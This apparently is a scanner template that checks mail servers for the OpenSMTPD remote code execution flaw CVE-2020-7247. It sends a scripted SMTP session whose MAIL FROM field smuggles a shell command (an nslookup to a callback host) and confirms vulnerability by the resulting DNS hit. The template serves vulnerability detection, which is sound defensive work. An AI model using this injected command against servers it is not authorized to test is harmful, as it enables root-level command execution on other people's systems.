id: CVE-2020-7247

info:
  name: OpenSMTPD 6.4.0-6.6.1 - Remote Code Execution
  author: princechaddha
  severity: critical
  description: |
    OpenSMTPD versions 6.4.0 - 6.6.1 are susceptible to remote code execution. smtp_mailaddr in smtp_session.c in OpenSMTPD 6.6, as used in OpenBSD 6.6 and other products, allows remote attackers to execute arbitrary commands as root via a crafted SMTP session, as demonstrated by shell metacharacters in a MAIL FROM field. This affects the "uncommented" default configuration. The issue exists because of an incorrect return value upon failure of input validation.
  reference:
    - https://www.openwall.com/lists/oss-security/2020/01/28/3
    - https://nvd.nist.gov/vuln/detail/CVE-2020-7247
    - https://github.com/openbsd/src/commit/9dcfda045474d8903224d175907bfc29761dcb45
    - http://www.openwall.com/lists/oss-security/2020/01/28/3
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2020-7247
    cwe-id: CWE-78,CWE-755
  tags: cve,cve2020,smtp,opensmtpd,network,rce,oast,kev

network:
  - inputs:
      - read: 1024
      - data: "helo target\r\n"
        read: 1024
      - data: "MAIL FROM:<;nslookup {{interactsh-url}};>\r\n"
        read: 1024
      - data: "RCPT TO:<root>\r\n"
        read: 1024
      - data: "DATA\r\n"
        read: 1024
      - data: "\r\nxxxx\r\n.\r\n"
        read: 1024
      - data: "QUIT\r\n"
        read: 1024
    host:
      - "{{Hostname}}"
      - "{{Host}}:25"

    matchers-condition: and
    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "dns"

      - type: word
        part: raw
        words:
          - "Message accepted for delivery"

# Enhanced by mp on 2022/04/29
